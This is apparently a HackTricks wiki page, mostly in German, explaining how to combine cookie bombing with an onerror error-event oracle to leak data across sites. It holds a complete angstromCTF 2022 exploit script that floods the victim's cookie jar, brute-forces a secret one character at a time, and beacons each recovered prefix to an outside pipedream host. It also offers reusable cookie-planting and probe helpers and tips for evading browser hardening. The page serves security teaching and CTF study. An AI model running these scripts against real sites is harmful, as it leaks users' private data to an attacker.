# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: das Browser des Opfers mit vielen/großen Cookies für die Ziel-Origin füllen, sodass nachfolgende Requests Server-/Request-Limits treffen (Request-Header-Größe, URL-Größe bei Redirects usw.).
- Error-event oracle: ein cross-origin Endpoint mit einem `<script>` (oder anderem Subresource) anfragen und Zustände mittels `onload` vs `onerror` unterscheiden.

High level idea
- Finde einen Ziel-Endpoint, dessen Verhalten sich für zwei Zustände unterscheidet, die du testen willst (z. B. Suche “hit” vs “miss”).
- Sorge dafür, dass der „hit“-Pfad eine umfangreiche Redirect-Kette oder eine lange URL auslöst, während der „miss“-Pfad kurz bleibt. Blase die Request-Header mit vielen Cookies auf, sodass nur der „hit“-Pfad den Server dazu bringt, aufgrund eines Limits mit einem HTTP-Fehler (z. B. 431/414/400) zu scheitern. Der Fehler kippt das onerror-Ereignis und wird so zu einem Oracle für XS-Search.

Wann funktioniert das
- Du kannst den Browser des Opfers dazu bringen, Cookies an das Ziel zu senden (z. B. Cookies sind SameSite=None oder du kannst sie in einem first-party Kontext via Popup `window.open` setzen).
- Es gibt eine App-Funktion, die du missbrauchen kannst, um beliebige Cookies zu setzen (z. B. „save preference“-Endpoints, die kontrollierte Eingaben in Set-Cookie umwandeln) oder um post-auth Redirects zu erzeugen, die angreiferkontrollierte Daten in die URL einbetten.
- Der Server reagiert in den beiden Zuständen unterschiedlich und überschreitet mit aufgeblähten Headern/URL in einem Zustand ein Limit und liefert eine Fehlerantwort, die onerror auslöst.

Hinweis zu Serverfehlern, die als Oracle verwendet werden
- 431 Request Header Fields Too Large wird häufig zurückgegeben, wenn Cookies die Request-Header aufblähen; 414 URI Too Long oder ein server-spezifischer 400 können bei langen Request-Zielen auftreten. Alle diese führen zu einem fehlgeschlagenen Subresource-Load und feuern onerror. Siehe [MDN’s 431 entry](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431) für typische Ursachen wie übermäßige Cookies.

<details>
<summary>Praktisches Beispiel (angstromCTF 2022)</summary>

The following script (from a public writeup) abuses a feature that lets the attacker insert arbitrary cookies, then loads a cross-origin search endpoint as a script. When the query is correct, the server performs a redirect that, together with the cookie bloat, exceeds server limits and returns an error status, so script.onerror fires; otherwise nothing happens.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
</details>

Warum das Popup (`window.open`)?
- Moderne Browser blockieren zunehmend third-party cookies. Das Öffnen eines top-level Fensters zum Ziel macht die cookies first‑party, sodass Set-Cookie-Antworten vom Ziel bestehen bleiben und den cookie-bomb Schritt ermöglichen — selbst bei Beschränkungen für third‑party cookies.

2024–2025 Hinweise zur Verfügbarkeit von Cookies
- Chrome’s Tracking Protection rollout (January 2024) blockiert bereits third-party cookies für eine zufällige Kohorte und soll auf die gesamte Nutzerbasis ausgeweitet werden, sobald die UK CMA zustimmt. Gehe davon aus, dass jede Zielperson jederzeit 3P cookies verlieren kann. Automatisiere das Fallback: erkenne, wenn dein Script-Probe fehlschlägt, ohne jemals das Ziel zu erreichen, und wechsle transparent in den popup/first-party-Flow. Safari und Firefox blockieren bereits standardmäßig die meisten third-party cookies, und CHIPS/partitioned cookies bedeuten, dass jede Top-Level-Site jetzt ihr eigenes Jar hat.
- Verwende einen first‑party cookie planting flow (`window.open` + auto-submit zu einem cookie-setting endpoint) und probe anschließend mit einer Subresource, die nur dann erfolgreich ist, wenn diese cookies gesendet werden. Sind third‑party cookies blockiert, verlege die Probe in einen same-site Kontext (z. B. führe das oracle im Popup über ein same-site Gadget aus und exfiltriere das Boolean mit `postMessage` oder einem beacon an deinen Server), oder melde die victim origin für Chrome’s deprecation trial an, falls du sie rechtmäßig kontrollierst.

<details>
<summary>Tracking-Protection-safe first-party planting helper</summary>

Wenn du Dutzende Cookies aus einem cross-site Kontext unterbringen musst, stage ein temporäres top-level Fenster und feuere eine Serie übergroßer Formular-Submits an den verwundbaren Set-Cookie-Endpunkt:
```js
async function plantFirstPartyCookies(endpoint, fields) {
for (let i = 0; i < 5; i++) {
const name = crypto.randomUUID();
const form = Object.assign(document.createElement('form'), {action:endpoint, method:'POST', target:name});
Object.entries(fields).forEach(([k, v]) => {
const input = document.createElement('input');
input.name = k;
input.value = v + '_'.repeat(400 + 120 * i);
form.appendChild(input);
});
document.body.appendChild(form);
window.open('about:blank', name, 'noopener');
form.submit();
await new Promise(r => setTimeout(r, 120));
form.remove();
}
}
```
Rufe es direkt auf, bevor du mit dem probing beginnst, damit jeder oracle run mit einem frisch gefüllten cookie jar startet.

</details>

Generic probing helper
Wenn du bereits eine Möglichkeit hast, viele cookies auf dem target origin (first-party) zu setzen, kannst du dieses minimale oracle gegen jeden Endpoint wiederverwenden, dessen Erfolg/Fehlschlag zu unterschiedlichen Netzwerk‑Outcomes (status/MIME/redirect) führt:
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternative tag oracle (Stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Fortgeschritten: de Bruijn–based cookie packing (CTF-proven)
- Wenn die App es dir erlaubt, große cookie values zu kontrollieren, kannst du Vermutungen effizient packen, indem du jeder Probe eine de Bruijn sequence anhängst. Das hält den per‑probe Overhead gering und stellt sicher, dass der heavy branch konsistent nur für das richtige prefix schwerer ist. Beispiel-Generator für |Σ| Symbole der Länge n (fits in a cookie value):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Idee in der Praxis: setze mehrere cookies, deren Werte aus prefix + deBruijn(k,n) bestehen. Nur wenn das getestete Prefix korrekt ist, nimmt der Server den schwereren Pfad (z. B. einen zusätzlichen redirect, der das lange Cookie oder die lange URL widerspiegelt), was in Kombination mit dem Cookie-Bloat Limits überschreitet und onerror umschaltet. Siehe einen öffentlichen LA CTF 2024 Solver, der diesen Ansatz verwendet.

Tips to build the oracle
- Erzwinge, dass der „positive“ Zustand schwerer ist: Kette einen zusätzlichen redirect nur, wenn das Prädikat wahr ist, oder lasse die redirect URL unbegrenzte Nutzereingabe widerspiegeln, sodass sie mit dem geratenen Prefix wächst.
- Inflate headers: wiederhole cookie bombing, bis auf dem „heavy“ Pfad ein konsistenter Fehler beobachtet wird. Server begrenzen üblicherweise die Header-Größe und schlagen früher fehl, wenn viele cookies vorhanden sind.
- Stabilize: führe mehrere parallele cookie set-Operationen aus und frage wiederholt ab, um Timing- und Caching-Rauschen zu mitteln.
- Bust caches and avoid pooling artifacts: füge einen zufälligen `#fragment` oder `?r=` zu Probe-URLs hinzu und verwende unterschiedliche Window-Namen bei `window.open`-Schleifen.
- Alternate subresources: wenn `<script>` gefiltert wird, versuche `<link rel=stylesheet>` oder `<img>`. Das onload/onerror-Boolean ist das Orakel; der Inhalt muss nie geparst werden.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs und Server erzwingen unterschiedliche Limits. Stand Oktober 2025 dokumentiert Cloudflare 128 KB insgesamt für request headers (und 16 KB URL) an der Edge, daher benötigen Sie möglicherweise mehr/größere cookies, wenn Ziele dahinter sitzen. Andere Stacks (z. B. Apache via LimitRequestFieldSize) liegen oft näher bei ~8 KB pro Header-Zeile und erreichen früher Fehler. Passe die Bombengröße entsprechend an (siehe [Cloudflare’s documented limit](https://developers.cloudflare.com/fundamentals/reference/connection-limits/)).

Browser hardening watchlist (2025+)
- Firefox 139/ESR 128.11 (Mai 2025) hat die Accounting von script-Tag load/error für cross-origin resources verschärft (CVE-2025-5266). Auf gepatchten Clients wird das `onerror`-Signal für bestimmte umgeleitete Antworten unterdrückt, daher diversifiziere das Orakel (parallel `<link rel=stylesheet>`, `<img>` oder `fetch` mit unpassendem MIME) und bestimme die UA des Opfers, bevor du annimmst, dass das Boolean-Signal noch feuert.
- Erwarte, dass Enterprise Chromium-Builds mit Tracking Protection oder Fetch Metadata-Policies gelegentlich cookies entfernen oder redirects umschreiben. Erkenne diese Fälle, indem du zuerst einen kurzen Endpoint testest; wenn dieser fehlschlägt, weiche automatisch darauf aus, den gesamten Angriff im Popup auszuführen und Bits über `postMessage`/`BroadcastChannel` zu übertragen.

Related XS-Search tricks
- URL-längenbasierte Orakel (keine cookies nötig) können kombiniert oder stattdessen verwendet werden, wenn du ein sehr langes Request-Ziel erzwingen kannst:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Notes
- Diese Klasse von Angriffen wird allgemein als “Error Events” XS-Leaks diskutiert. Der cookie-bomb-Schritt ist nur ein praktischer Weg, um nur einen Zweig über Serverlimits zu drücken und ein zuverlässiges boolean-Orakel zu erzeugen.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
- Chrome Tracking Protection rollout details: https://blog.google/products/chrome/privacy-sandbox-tracking-protection/
- Mozilla MFSA 2025-44 (CVE-2025-5266) tightening script tag onerror behavior: https://www.mozilla.org/en-US/security/advisories/mfsa2025-44/
{{#include ../../banners/hacktricks-training.md}}
